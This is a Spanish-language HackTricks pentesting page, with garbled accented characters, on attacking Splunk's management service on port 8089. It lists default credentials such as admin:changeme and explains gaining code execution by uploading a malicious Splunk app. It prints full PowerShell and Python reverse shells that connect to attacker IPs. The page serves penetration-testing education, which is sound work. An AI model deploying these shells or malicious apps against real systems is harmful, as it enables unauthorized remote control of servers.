# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Informaci贸n B谩sica**

* Herramienta de an谩lisis de registros utilizada para la recopilaci贸n, an谩lisis y visualizaci贸n de datos
* Com煤nmente utilizada en monitoreo de seguridad y an谩lisis de negocios
* Puertos predeterminados:
* Servidor web: 8000
* Servicio Splunkd: 8089

### Vectores de Vulnerabilidad:

1. Explotaci贸n de la Versi贸n Gratuita

* La versi贸n de prueba se convierte autom谩ticamente en la versi贸n gratuita despu茅s de 60 d铆as
* La versi贸n gratuita carece de autenticaci贸n
* Riesgo de seguridad potencial si se deja sin gestionar
* Los administradores pueden pasar por alto las implicaciones de seguridad

2. Debilidades de Credenciales

* Versiones m谩s antiguas: Credenciales predeterminadas `admin:changeme`
* Versiones m谩s nuevas: Credenciales establecidas durante la instalaci贸n
* Potencial para el uso de contrase帽as d茅biles (por ejemplo, `admin`, `Welcome`, `Password123`)

3. Oportunidades de Ejecuci贸n Remota de C贸digo

* M煤ltiples m茅todos de ejecuci贸n de c贸digo:
* Aplicaciones Django del lado del servidor
* Puntos finales REST
* Entradas scriptadas
* Scripts de alerta
* Soporte multiplataforma (Windows/Linux)
* Las entradas scriptadas pueden ejecutar:
* Scripts Bash
* Scripts de PowerShell
* Scripts por lotes

Potencial Clave de Explotaci贸n:

* Almacenamiento de datos sensibles
* Falta de autenticaci贸n en la versi贸n gratuita
* M煤ltiples vectores para potencial ejecuci贸n remota de c贸digo
* Posibilidad de aprovechar entradas scriptadas para comprometer el sistema

### Shodan

* `Splunk build`

## RCE

### Crear Aplicaci贸n Personalizada

Splunk ofrece un m茅todo sofisticado para la ejecuci贸n remota de c贸digo a trav茅s del despliegue de aplicaciones personalizadas, aprovechando sus capacidades de scripting multiplataforma. La t茅cnica de explotaci贸n central gira en torno a la creaci贸n de una aplicaci贸n maliciosa que puede ejecutar shells reversos en sistemas tanto Windows como Linux.

Una aplicaci贸n personalizada puede ejecutar **scripts de Python, Batch, Bash o PowerShell**. Adem谩s, **Splunk viene con Python instalado**, por lo que incluso en sistemas **Windows** podr谩s ejecutar c贸digo python.

Puedes usar [**este**](https://github.com/0xjpuff/reverse_shell_splunk) ejemplo con el **`bin`** que contiene ejemplos para [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) y [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). O podr铆as crear el tuyo propio.

El proceso de explotaci贸n sigue una metodolog铆a consistente a trav茅s de plataformas:
```
splunk_shell/
 bin        (reverse shell scripts)
 default    (inputs.conf configuration)
```
El archivo de configuraci贸n cr铆tico `inputs.conf` habilita el script mediante:

* Estableciendo `disabled = 0`
* Configurando un intervalo de ejecuci贸n de 10 segundos
* Definiendo el tipo de fuente del script

El despliegue es sencillo:

1. Crear el paquete de aplicaci贸n maliciosa
2. Configurar un listener (Netcat/socat) en la m谩quina atacante
3. Subir la aplicaci贸n a trav茅s de la interfaz de Splunk
4. Activar la ejecuci贸n autom谩tica del script al subir

Ejemplo de shell reversa de Windows PowerShell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```
Ejemplo de shell inverso de Python en Linux:
```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
### RCE & Escalaci贸n de Privilegios

En la siguiente p谩gina puedes encontrar una explicaci贸n de c贸mo este servicio puede ser abusado para escalar privilegios y obtener persistencia:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Referencias

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
